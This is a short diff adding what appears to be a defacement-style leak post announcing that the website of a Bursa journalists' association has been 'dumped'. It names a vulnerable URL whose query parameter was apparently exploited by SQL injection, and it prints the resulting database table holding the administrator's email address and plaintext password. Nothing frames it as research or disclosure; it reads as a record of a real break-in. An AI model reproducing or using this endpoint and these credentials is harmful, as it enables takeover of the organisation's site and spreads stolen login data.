@@ -1,0 +1,12 @@
+BURSA GAZETECİLER CEMİYETİ DUMPED
+
+VULN URL : http://bgc.org.tr/core/php/inc/foo_nav.php?cat=1
+
+Database: bgcftp_db
+Table: uye
+[1 entry]
++----+-----------+---------------+-----------------+---------+----------+-------+
+| id | tc_kimlik | adsoyad       | mail            | telefon | parola   | yetki |
++----+-----------+---------------+-----------------+---------+----------+-------+
+| 1  | <blank>   | Administrator | info@bgc.org.tr | <blank> | B.y78cTZ | 1     |
++----+-----------+---------------+-----------------+---------+----------+-------+
